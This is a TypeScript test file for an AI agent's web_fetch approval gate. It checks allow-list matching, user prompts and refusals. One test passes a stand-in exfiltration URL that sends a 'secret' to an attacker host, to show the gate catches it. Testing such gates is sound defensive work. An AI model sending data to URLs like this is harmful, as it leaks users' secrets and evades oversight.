/** Asking before `web_fetch` sends a URL off the machine, through the real registry, seam, and tool plugin. */
import { afterEach, describe, expect, it, vi } from 'vitest'
import { Context } from '@deepseek-ai/cordis'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRuntime, { type PreToolDecision } from '@deepseek-ai/dsh-tools'
import WebRuntime, { type WebFetchProvider } from '@deepseek-ai/dsh-web'
import { ToolCallId } from '@deepseek-ai/dsh-llm'
import type { Agent } from '@deepseek-ai/dsh-agent'
import * as ToolWeb from '../src/index.ts'
import { hostAllowed } from '../src/fetch-approval.ts'

const roots: Context[] = []
afterEach(async () => { await Promise.all(roots.splice(0).map(ctx => ctx.fiber.dispose())) })

const agent = { session: { id: 'session' } } as Agent

async function bench(config: ToolWeb.Config = {}) {
  const ctx = new Context()
  roots.push(ctx)
  await ctx.plugin(SystemPrompt)
  await ctx.plugin(ToolRuntime)
  await ctx.plugin(WebRuntime, { fetchProvider: 'stub-fetch' })
  const fetched: string[] = []
  const provider: WebFetchProvider = {
    id: 'stub-fetch',
    available: () => true,
    fetch: (request) => {
      fetched.push(request.url)
      return Promise.resolve({ url: request.url, statusCode: 200, body: { kind: 'text' as const, content: 'page' }, truncated: false })
    },
  }
  ctx.web.registerFetchProvider(provider)
  await ctx.plugin(ToolWeb, config)
  const request = vi.fn((_request: { reason?: string; displayReason?: { en: string } }) => Promise.resolve<'allowed-once' | 'rejected'>('allowed-once'))
  ctx.provide('approval', { request } as never)
  let seq = 0
  /** Call as the test Session's agent, or with no agent when `caller` is null. */
  const call = (url: unknown, caller: Agent | null = agent) => ctx.tools.execute({
    name: 'web_fetch', arguments: { url }, callId: ToolCallId(`fetch-${++seq}`), signal: new AbortController().signal,
    ...caller === null ? {} : { agent: caller },
  })
  return { ctx, fetched, request, call }
}

describe('hostAllowed', () => {
  it('matches exact hosts and the subdomains of a "*." entry, in any casing', () => {
    expect(hostAllowed('docs.example.com', ['docs.example.com'])).toBe(true)
    expect(hostAllowed('a.b.example.com', [' *.Example.com '])).toBe(true)
    expect(hostAllowed('example.com', ['*.example.com'])).toBe(false)
    expect(hostAllowed('evil-example.com', ['*.example.com'])).toBe(false)
    expect(hostAllowed('other.test', [])).toBe(false)
  })
})

describe('web_fetch approval', () => {
  it('asks with the exact URL before fetching, and fetches only when allowed', async () => {
    const { fetched, request, call } = await bench()
    const url = 'https://attacker.test/collect?d=secret'
    expect((await call(url)).isError).toBe(false)
    expect(request.mock.calls[0]?.[0]).toMatchObject({
      reason: `web_fetch of ${url} requires approval: attacker.test is not on the fetch allow-list`,
      displayReason: { en: `Allow fetching ${url}?` },
    })
    request.mockResolvedValue('rejected')
    expect((await call('https://attacker.test/again')).isError).toBe(true)
    expect(fetched).toEqual([url])
  })

  it('fetches allow-listed hosts, and every host under "allow", without asking', async () => {
    const listed = await bench({ fetchAllowedHosts: ['*.example.com'] })
    expect((await listed.call('https://docs.example.com/page')).isError).toBe(false)
    expect(listed.request).not.toHaveBeenCalled()
    const open = await bench({ fetchApproval: 'allow' })
    expect((await open.call('https://anywhere.test/')).isError).toBe(false)
    expect(open.request).not.toHaveBeenCalled()
  })

  it('does not ask in a Session with full access, and refuses when no one can be asked', async () => {
    const { ctx, request, call } = await bench()
    ctx.provide('sandboxPolicy', { resolve: () => ({ mode: 'danger-full-access' }) } as never)
    expect((await call('https://anywhere.test/')).isError).toBe(false)
    expect(request).not.toHaveBeenCalled()
    // An agentless caller has no one to ask.
    expect((await call('https://anywhere.test/', null)).isError).toBe(true)
  })

  it('leaves an unparsable URL to the fetch provider, which refuses it, and never relaxes a later refusal', async () => {
    const { ctx, fetched, request, call } = await bench()
    await call('not a url')
    expect(request).not.toHaveBeenCalled()
    expect(fetched).toEqual(['not a url'])
    ctx.on('tools/pre-execute', (): Promise<PreToolDecision> => Promise.resolve({ kind: 'deny', reason: 'blocked by a hook' }))
    expect(JSON.stringify(await call('https://anywhere.test/'))).toContain('blocked by a hook')
    expect(request).not.toHaveBeenCalled()
    expect(fetched).toEqual(['not a url'])
  })

  it('refuses a malformed allow-list entry at load', async () => {
    for (const entry of ['https://a.test', 'a.test/path', '*', 'a.*.test', '']) {
      await expect(bench({ fetchAllowedHosts: [entry] })).rejects.toThrow('must be a host name or "*." followed by a domain')
    }
  })
})
